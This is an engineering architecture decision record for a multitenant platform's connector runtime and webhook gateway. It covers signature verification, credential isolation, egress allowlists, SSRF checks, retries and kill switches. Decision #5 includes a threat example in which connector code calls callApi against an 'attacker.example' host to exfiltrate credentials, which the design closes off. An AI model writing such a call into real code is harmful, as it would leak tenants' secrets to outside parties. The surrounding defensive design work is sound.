# ADR-009: Connector Runtime & Webhook Gateway Architecture

**Status:** Accepted.  
**Date:** 2026-08-06.  
**Deciders:** Engineering lead, Platform architect.  
**Supersedes:** —  
**Related to:** ADR-001 (multitenancy/RLS), ADR-004 (config-first module design), ADR-008
(credential lifecycle hardening — agent/delegation identity is deferred, see Deferred Decisions).  
**Superseded by:** —

---

## Context

### What exists today that this design must reuse, not duplicate

- **Outbound delivery pipeline (issue #125/PR #211):** `apps/worker/src/outbox-poller.ts` polls
  `outbox_events` (`FOR UPDATE SKIP LOCKED`) into BullMQ; `notification-outbound-worker.ts` is the
  working pattern for an outbound HTTP seam. **Important caveat found in review round 2:** the
  poller claims rows with a positive allowlist — `WHERE event_type IN ('workflow.transitioned',
'workflow.sla_breached', 'entity.created', 'entity.assigned')` — and its own code comment warns
  this exact list previously caused a silently-unscheduled SLA check when a new event type was
  added without updating it. A `connector.*` event type is not on that list. See Decision #3.
- **SSRF guard:** `packages/automation-engine/src/ssrf-guard.ts` (`validateWebhookUrl`) — fails
  closed, DNS-pinned, CIDR-blocklisted. The human-review-required rule for this file is in
  `.claude/rules/agent-behaviour.md:96` (not `CLAUDE.md`, corrected in rev.2). **Open, unresolved
  doc conflict:** `.claude/context/automation-engine.md:77` says issue #2 is closed (PR #85);
  `agent-behaviour.md:96` still lists it as human-review-required. This ADR only _calls_
  `validateWebhookUrl()`, never modifies it, so it's unaffected either way — flagged for
  independent housekeeping, see Deferred Decisions.
- **Tenant-scoped encryption:** `packages/secrets/src/transit.ts` (OpenBao Transit). Right
  primitive for `connector_credentials`; no new crypto proposed.
- **Rate limiting:** `packages/redis/src/rate-limit.ts`'s `checkRateLimit()` is key-agnostic, but
  its fail-open behavior is **hardcoded in the function's own `catch` block**
  (`packages/redis/src/rate-limit.ts:48-51`, unconditional `return {allowed:true}` on any Redis
  error, with a documented 250ms timeout specifically so this never blocks the hot path). A
  fail-_closed_ tier cannot be built by calling this function with new key dimensions — it needs
  new code. See Deferred Decisions for why this ADR no longer proposes building that new code yet.
- **Connector SDK type contracts:** `packages/connector-sdk/src/types.ts` — types only, no
  runtime, no tests, **zero installed connectors today**. This matters directly: any breaking
  change to these types costs nothing right now and becomes expensive the moment a real connector
  is written against them. Two such changes are decided below (Decision #5) precisely because the
  cost is zero today.
- **Existing sibling isolation mechanisms** (found in review round 2, previously unreferenced by
  this draft): `script` automation actions run in `isolated-vm` with a 500ms cap and no Node
  globals; the plugin system (issue #17) gets per-plugin Postgres schema namespacing, permission
  validation, SRI hashes on `remoteEntry.js`, and a `plugin_errors` isolation table. **The
  connector runtime as drafted has no equivalent isolation mechanism** — see Decision #6.
- **Existing data-classification infrastructure** (found in review round 2, previously
  unreferenced): `packages/db/migrations/0008_entity_fields_sensitivity.sql` adds
  `entity_fields.sensitivity` (`public`/`internal`/`pii`/`financial`), and
  `packages/workflow-engine/src/redact.ts` implements a working redactor against it. This is the
  platform's actual answer to "data type classification" — see Decision #10.
- **Existing kill-switch precedent:** `docs/specs/outbound-notifications-kill-switch.md` — an
  approved spec for a live-flippable `platform_settings` flag, fail-closed on lookup error, no
  restart required. Written for a different failure mode (the notification _service itself_ being
  down, platform-wide) — extending it to a per-`(tenantId, connectorId)` dimension is new work,
  not a direct reuse, but it's the right pattern to extend. See Decision #9.
- **Tracked, already-open prerequisite this draft previously missed:** issue #143,
  "Automation-triggered transitions absent from outbox — Phase 3A connector gap," assigned and
  open. Whoever picks up this ADR should close #143 first or account for it explicitly.

### Cross-checked against issue #16 / `docs/roadmap.md` §3A

Issue #16 and the roadmap table classify: **Core** — webhook gateway, outbound webhook+SSRF,
credential decrypt via OpenBao with "connector code never sees raw secrets," OAuth token refresh,
polling scheduler, `connector.action` action type, install/uninstall lifecycle,
`connector_definitions`/`connector_credentials`, email(SMTP/IMAP), Slack. **Important** — Stripe,
QuickBooks, WhatsApp Business, Connector DPA framework (issue #6). **Optional** — Trigger.dev
iPaaS bridge (issue #16's own body groups this under "Important" — the two source documents
disagree; independent housekeeping item, see Deferred Decisions).

### Product decision: v1 connector set is email + WhatsApp Business, not Slack-first

Round 2 of review recommended a single-connector (Slack) v1 to minimize scope before any real
connector exists. **The human decider overrode this**: v1 ships **email (SMTP/IMAP, Core) and
WhatsApp Business (Important)**, skipping Slack (Core) for now — a deliberate pilot-customer-
driven prioritization, not an oversight; a future reader should not mistake this for Slack being
forgotten. This changes what can be deferred:

- **The polling scheduler and its cursor-storage question (round-2 Decision #6) are back in v1
  scope** — email/IMAP needs polling; it cannot be deferred to "whenever email is built" because
  email is being built now. Cursor storage is resolved below (Decision #7).
- **OAuth token-refresh generality is narrowed, not fully deferred** — see Decision #4's scoping.
- **The fail-closed rate-limit tier deferral still holds** regardless of which two connectors ship
  first — the reasoning was "no live traffic yet to calibrate a limit against," which is true for
  email+WhatsApp exactly as it was for Slack. See Deferred Decisions.

---

## Decision (proposed)

1. **Build a thin in-house connector runtime on top of the existing `connector-sdk` type
   contracts, rather than adopting an embedded iPaaS vendor.** The platform is config-first
   everywhere else (ADR-004); a vendor-hosted runtime would be the one integration layer that
   isn't; compliance-critical pieces (tenant-scoped encryption, credential handling) must be built
   regardless of vendor choice. Revisit only if a long-tail connector backlog becomes the actual
   bottleneck, decided from real usage data post-launch.

2. **v1 hand-built connectors: email (SMTP/IMAP) and WhatsApp Business.** Slack, Stripe, and
   QuickBooks are deferred (see Deferred Decisions) — not dropped. A generic, config-driven
   fallback connector type (webhook + API-key auth to a customer-configured URL) ships alongside
   these two for the common "call a URL with a scoped key" case, with a declarative field-mapping
   config for its inbound path (see Decision #8) rather than requiring a TypeScript transform —
   keeping the fallback path config-first per ADR-004, unlike the two hand-built connectors, which
   are genuinely `ConnectorDefinition` code. **(OQ-2, resolved):** the fallback connector is a
   platform-level feature, not a `modules/`-style seed — it's core integration infrastructure for
   every tenant, not a business-domain config like the actual modules are.

3. **Inbound webhook gateway:** `POST /webhooks/{connectorId}/{tenantId}`. Order of operations:
   (a) an unauthenticated, IP-keyed, fail-_open_ flood guard (reusing the existing pre-auth pattern
   in `apps/api/src/middleware/rate-limit.ts` — not the fail-closed tier, see Deferred Decisions);
   (b) HMAC signature verification, centralized in the gateway runtime, not delegated to each
   connector's own `validateSignature` implementation as the current SDK types would allow — see
   Decision #5. Verification is: signature over `timestamp + "." + rawBody`, a header carrying
   both signature and timestamp, a ±5 minute timestamp tolerance (matching the Stripe/Svix
   precedent cited in prior research), constant-time comparison, and a replay-dedupe store keyed
   on a per-request idempotency identifier (mirroring `svix-id`) with a TTL matching the tolerance
   window. Unknown tenant/connector and signature failure both return the same status (401) to
   avoid an existence oracle, consistent with this repo's 404-not-403 convention for the analogous
   cross-tenant case; (c) run the connector's trigger-transform, then publish onto a **dedicated
   `connector-inbound` queue, not `outbox_events`** — see Decision #6 for why.

4. **OAuth token refresh is handled inside `ConnectorContext.callApi()`, scoped to what v1
   actually needs.** WhatsApp Business Cloud API uses a long-lived system-user access token in the
   common case, not a short-lived OAuth token requiring per-call refresh — v1's WhatsApp connector
   should be built against that model, with periodic manual/administrative token regeneration, not
   transparent refresh. Email/IMAP v1 targets **basic SMTP/IMAP credential auth** (username +
   password, stored like any other credential), explicitly **not** OAuth-authenticated providers
   (Gmail/Office 365 require OAuth for IMAP) — those are deferred (see Deferred Decisions).
   `ctx.callApi()` still exists as the seam for future OAuth refresh; it is not required to
   implement refresh logic for v1's two connectors. WhatsApp's token-lifecycle assumption is now
   confirmed against Meta's current API docs (OQ-1, resolved) — a monitoring mechanism for
   eventual token regeneration still needs implementation-time confirmation (OQ-5).

5. **Connector code never sees raw secrets — enforced by construction, not by convention** (Core,
   stated explicitly in roadmap §3A). This requires two changes to the existing type contract in
   `packages/connector-sdk/src/types.ts`, both **decided now while the cost is zero** (no runtime,
   no installed connectors exist yet — found in review round 2):
   - Remove `credentials: TCredentials` as a readable field on `ConnectorContext`. Replace with
     `callApi(request)`, which decrypts and attaches credentials server-side inside the runtime,
     never exposing the plaintext to connector code.
   - `callApi()` enforces a **per-connector egress allowlist** (declared in the connector's
     `ConnectorDefinition`, e.g. the specific third-party API host(s) it's allowed to call) and
     runs `validateWebhookUrl()` against the target on every call — not just for outbound webhook
     delivery (Decision #9). Without this, `callApi({url: "https://attacker.example"})` from
     connector code is a credential-exfiltration oracle regardless of how the credential itself is
     hidden — found in review round 2, and it defeats this decision's own goal if left unfixed.
   - `TriggerDefinition.webhook.validateSignature` currently hands the raw signing secret to
     connector-authored code — remove it; verification is centralized per Decision #3 instead.
   - Secret hygiene: `ConnectorContext.log()` and any error/response object connector code can
     touch must pass through the same redaction path `packages/logger` already applies (extended
     — see Decision #10's note on this), and decrypted credentials must never be placed on a
     long-lived object, only used at the point of an outgoing call.

6. **Connector code trust boundary for v1: first-party, hand-built, in-process — no third-party
   marketplace submission yet.** Neither draft had ever stated this explicitly (review round 2).
   Given finding above (in-process code can `import { db }` and bypass RLS's per-call-path
   enforcement, or `import { decryptCredential }` and read another connector's secrets given a
   tenant id), admitting arbitrary third-party-authored connector code into this runtime without a
   real isolation mechanism (matching `script` actions' `isolated-vm` sandbox, or process-level
   isolation) would be a materially different security posture than what's decided here. The
   roadmap's "connector marketplace UI" (Core) is a browse/install/configure UI over the
   platform's own hand-built + generic-fallback connectors for v1 — not a third-party submission
   marketplace. Opening the marketplace to externally-authored connector code is deferred until a
   sandbox mechanism is decided (see Deferred Decisions).

7. **Connector polling scheduler**, needed now for email/IMAP: a BullMQ _repeatable_ job per
   connector-per-tenant installation, distinct from the webhook gateway's push path. Cursor state
   (e.g. last-seen IMAP UID) lives as a JSONB column on `connector_credentials` (one row per
   tenant-connector installation already; adding cursor state there avoids a second table for what
   is 1:1 data) — resolves the round-2 open question on cursor storage.

8. **`connector_definitions` (installable catalog, read by the marketplace UI) and
   `connector_credentials` (one row per tenant-connector installation, created on install,
   including the cursor-state column from Decision #7) are two distinct tables.**
   `connector_definitions` is catalog data (tenant-independent, RLS disabled) — **not an informal
   convention, but an exact match to `ADR-001-multitenancy.md:236`, which already names
   `connector_definitions` by name** as one of the platform-wide tables with RLS disabled,
   readable by `app_user`, writable only by `migration_user`/admin-role endpoints (alongside
   `tenants`, `modules`, `entity_types`, `workflow_templates`). `connector_credentials` is
   tenant-scoped and RLS-protected. The generic fallback connector's inbound field-mapping
   (Decision #2) is stored as declarative JSON (payload-path → entity-field pairs) on the
   installation row, not code.

9. **Outbound delivery — corrected retry semantics, not a blind reuse of the notification
   queue's config.** Extends the outbox pattern (issue #125) but **with its own BullMQ queue
   configuration**, not `apps/worker/src/queues.ts`'s existing 3-attempts/1s-exponential-backoff
   config verbatim — that totals roughly 7 seconds of retry window, nowhere near the
   Stripe/Svix-class tail this ADR's own research cites (hours to ~27 hours), and it silently
   contradicts this repo's own `docs/architecture-brief.md`/`docs/platform-vision.md` commitments
   to a 30-day delivery log (found in review round 2 — this ADR was at risk of dropping a
   commitment its own source docs already make). Concretely: signing (HMAC-SHA256 over
   `timestamp + body`), a `delivery_id` idempotency header, an envelope `version` field (restoring
   `architecture-brief.md` §6.2's event-schema-versioning proposal, dropped in rev.1/rev.2 despite
   this ADR claiming to supersede that exact section), mandatory per-attempt `validateWebhookUrl()`
   (not just at configuration time — URLs can be reconfigured to point at internal targets after
   initial validation), and **a delivery-attempt record** (one row per attempt: status, latency,
   error, next-retry-at) — without this, `dead_letter_events` (which today has zero readers
   anywhere in `apps/api` or `apps/admin-ui`) means a dead-lettered delivery simply disappears,
   making retrospective reconstruction impossible even if a redrive _UI_ is deferred.

10. **Outbound payloads are explicit field allowlists, and `pii`/`financial`-classified fields
    require an explicit per-connector grant to cross the tenant boundary** — reusing
    `packages/workflow-engine`'s existing sensitivity taxonomy and redactor rather than building a
    parallel mechanism or leaving this to the deferred DPA framework (issue #6), which is
    governance metadata, not an enforcement control, and doesn't by itself stop a `financial`-typed
    field from being serialized whole into a webhook body. Connector action payloads are also
    enforced against their declared Zod schema and a declared max size at the runtime boundary
    (not just typed at the SDK-contract level as today) — an integrity/DoS control, distinct from
    and in addition to the confidentiality control above.

11. **A non-destructive kill switch, not just install/uninstall.** Extending
    `docs/specs/outbound-notifications-kill-switch.md`'s pattern to a per-`(tenantId, connectorId)`
    flag: disable delivery/polling for one tenant's one connector installation without running
    `onUninstall` or destroying the credential row. Uninstall (which does run `onUninstall` and
    remove the row) remains the separate, destructive lifecycle operation from Decision #2's
    original install/uninstall design — the kill switch is for "stop this now, investigate,
    possibly resume," not "remove this integration."

---

## Consequences

### Positive

- Reuses the outbox pattern's _shape_ (async, retryable, auditable) while giving connector
  delivery its own queue and retry configuration — avoids both duplicating infrastructure and
  silently inheriting a retry budget sized for a different workload.
- The `callApi()`-only credential model, the egress allowlist, and the explicit v1 trust-boundary
  statement (first-party only) close the most severe finding from review round 2 (a
  credential-exfiltration oracle) at zero migration cost, because no connector exists yet to break.
- Field-allowlist + sensitivity-grant enforcement on outbound payloads gives a concrete, working
  answer to the "data type classification" requirement from the original integration-strategy ask,
  reusing infrastructure that already exists and was previously going unused for this purpose.
- Starting with email + WhatsApp (rather than Slack-first) still keeps the fail-open,
  low-new-code rate-limiting posture for v1, because the deferral reasoning (no live traffic to
  calibrate against) doesn't depend on which two connectors ship first.

### Negative and mitigations

- **Two connectors instead of one means the polling scheduler, cursor storage, and a
  credential-lifecycle decision (basic-auth-only email) all land in v1 simultaneously**, rather
  than being staged one mechanism at a time. Accepted per explicit product direction; mitigated by
  narrowing OAuth-refresh scope (Decision #4) so at least that mechanism doesn't also land now.
- **WhatsApp's token-lifecycle assumption (long-lived system-user token, no transparent refresh
  needed) is now confirmed against Meta's current API (OQ-1, resolved)** — but "long-lived" isn't
  "eternal," and no monitoring mechanism for eventual regeneration is built yet (OQ-5, proposed
  default not yet confirmed).
- **Basic-auth-only email excludes Gmail/Office 365 out of the gate**, which are extremely common
  in practice. Accepted as a deliberate v1 narrowing (see Deferred Decisions) — the single most
  consequential scope cut in this revision, **confirmed acceptable against actual pilot-customer
  mail-provider distribution (OQ-3, resolved)**.
- **The dedicated `connector-inbound` queue (Decision #3) is new infrastructure**, not reuse —
  the alternative (reusing `outbox_events`) was rejected because its allowlist would silently drop
  connector events, and because this repo's own `docs/specs/api-request-observability.md` §I
  already reasoned through an analogous case ("sharing the outbox table risks its poller falling
  behind on real triggers during traffic spikes... a dedicated queue keeps the two concerns fully
  isolated") for a structurally similar high-volume/externally-driven workload. Cost: one more
  BullMQ queue to operate and monitor.
- **No third-party marketplace submission path exists after this ADR** — issue #16's "connector
  marketplace UI" ships, but only over first-party connectors. If a near-term product requirement
  needs external developers submitting connectors, that requires a new isolation-mechanism decision
  first, not just marketplace UI work.

---

## Deferred Decisions

Named explicitly, each with a trigger condition — not silent omissions, and not "someday."

| Deferred item                                                                              | Trigger to revisit                                                                                                                                              | Why deferred now                                                                                                                                                                                                                                                                                                                                                              |
| ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Slack, Stripe, QuickBooks connectors                                                       | Pilot-customer demand signal, or when email+WhatsApp's runtime is stable in production                                                                          | Explicit product prioritization this revision — email+WhatsApp first.                                                                                                                                                                                                                                                                                                         |
| OAuth-authenticated email providers (Gmail, Office 365)                                    | First pilot customer whose mailbox requires OAuth (i.e. can't use basic SMTP/IMAP auth)                                                                         | Avoids building OAuth-refresh generality before a connector needs it; basic-auth IMAP covers a real subset of providers today.                                                                                                                                                                                                                                                |
| Fail-closed per-connector rate-limit tier                                                  | Real incident or observed connector traffic pattern demonstrating the existing fail-open tenant/IP tiers are insufficient — **not** before that evidence exists | No live connector traffic exists yet to size a limit against; the tier as originally specified (keyed on unauthenticated path params, pre-signature-verification) was also found in review round 2 to be a potential DoS vector, not just premature — building it later, informed by real traffic and keyed on a verified dimension, is strictly better than building it now. |
| Third-party/community connector marketplace submission                                     | A sandbox/isolation mechanism (process isolation, or an `isolated-vm`-style approach matching `script` actions) is decided and built                            | Current runtime has no isolation boundary; admitting externally-authored code without one is a materially different risk posture than this ADR decides.                                                                                                                                                                                                                       |
| Trigger.dev iPaaS bridge (`architecture-brief.md` §6.5)                                    | Independent of this ADR — roadmap classifies it Optional-tier                                                                                                   | Solves a different problem (long-running/human-in-the-loop orchestration) than the connector marketplace this ADR covers; not folded in or dropped, just out of this ADR's scope.                                                                                                                                                                                             |
| Connector DPA framework (issue #6)                                                         | Its own ADR, owned by issue #6                                                                                                                                  | Governance/compliance metadata, not an architecture decision this ADR needs to make — this ADR only guarantees `connector_definitions` can carry additive metadata columns for it later.                                                                                                                                                                                      |
| Policy-as-code authorization (OPA/Cedar-style, beyond the field-allowlist in Decision #10) | A concrete case where allowlist-based scoping is insufficient                                                                                                   | Field allowlists + sensitivity grants cover the near-term need; a rules engine is real over-engineering for a platform with two connectors.                                                                                                                                                                                                                                   |
| Consistent-hashing / hot-key rate-limit distribution (Stripe's technique)                  | Observed single-Redis-node contention at scale                                                                                                                  | Single Redis instance is adequate at pilot volume; revisit only with real evidence of contention.                                                                                                                                                                                                                                                                             |
| Multi-region/DR for the delivery pipeline                                                  | Not applicable at current platform stage                                                                                                                        | No multi-region requirement exists anywhere in the roadmap today.                                                                                                                                                                                                                                                                                                             |

---

## Independent housekeeping (not blocking this ADR, found during review)

1. Doc-vs-doc conflict: `.claude/rules/agent-behaviour.md` (issue #2 human-review-required) vs.
   `.claude/context/automation-engine.md` (issue #2 closed, PR #85).
2. Doc-vs-doc conflict: issue #16's body groups Trigger.dev under "Important"; `docs/roadmap.md`
   §3A's table classifies it "Optional."
3. **New, found in review round 2:** `CLAUDE.md`/`docs/sup-docs/roadmap-tracker.md` call the
   observability/compliance track "3D"; `docs/roadmap.md` calls it "3E" and assigns "3D" to the
   advanced workflow builder instead. Whoever is told to "coordinate with 3D" needs the right one.
4. Issue #143 ("automation-triggered transitions absent from outbox — Phase 3A connector gap") is
   open, assigned, and unreferenced by any revision of this draft until now — confirm its
   resolution status before or alongside implementing Decision #3.

---

## Open Questions

| ID   | Question                                                                                                                                                                                                                                                                                                                 | Notes                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| OQ-1 | **Resolved (2026-08-05):** Meta's official docs (developers.facebook.com/documentation/business-messaging/whatsapp/access-tokens/) confirm system-user tokens are designed as long-lived, matching Decision #4's assumption — a regular user token expires in ~24h, a system-user token does not on that same timescale. | "Long-lived" is not "never expires" — Meta doesn't document a guarantee of eternal validity, and app permission changes or Meta policy shifts could still invalidate one. Decision #4's "periodic manual/administrative token regeneration" needs an actual monitoring/alerting mechanism (e.g. alert on a sustained WhatsApp API auth-failure rate) so "periodic" doesn't mean "whenever someone happens to notice it's broken" — see OQ-5. |
| OQ-2 | **Resolved (2026-08-05):** Platform-level feature, not a `modules/`-style seed config.                                                                                                                                                                                                                                   | It's core integration infrastructure available to every tenant regardless of installed modules — not a business-domain config like helpdesk/CRM seed data. Modules per ADR-004 are domain-specific; the generic fallback connector isn't. Decision #2's "declarative JSON field-mapping, not code" framing already fits this — it just doesn't live under `modules/`.                                                                        |
| OQ-3 | **Resolved (2026-08-05):** acceptable as scoped — confirmed against actual pilot-customer mail-provider distribution, proceed with basic-auth-only email for v1.                                                                                                                                                         | No revisit needed before implementation; Gmail/Office 365 OAuth support stays in Deferred Decisions per its existing trigger.                                                                                                                                                                                                                                                                                                                |
| OQ-4 | **Resolved (2026-08-05):** same owner as the existing BullMQ queues.                                                                                                                                                                                                                                                     | No new ownership structure needed.                                                                                                                                                                                                                                                                                                                                                                                                           |
| OQ-5 | **Proposed default, not yet confirmed:** alert on a sustained WhatsApp API auth-failure rate (reusing existing logging/monitoring infra), rather than building bespoke token-health tracking.                                                                                                                            | Cheapest mechanism that still avoids "silently broken with no alert" — confirm at implementation time that the existing monitoring stack can actually express this alert condition.                                                                                                                                                                                                                                                          |

---

## Implementation next steps

1. Fix the four independent housekeeping items above in their own small pass — don't gate them on
   this ADR's acceptance.
2. Confirm issue #143's status and account for it before implementing Decision #3.
3. Update `packages/connector-sdk/src/types.ts` per Decision #5/#6 as an early, cheap PR — the
   breaking changes cost nothing today and get more expensive with every day of delay.
4. Build email + WhatsApp connectors and the shared runtime together — the runtime decisions above
   (callApi, egress allowlist, polling scheduler, dedicated inbound queue, delivery-attempt
   record, kill switch) are sized for exactly these two, not sized for a five-connector launch.
5. Add isolation tests for `connector_definitions` and `connector_credentials` (Decision #8) in the
   same PR that creates them, per this repo's own `testing-conventions.md` mandate for new
   tenant-scoped tables.
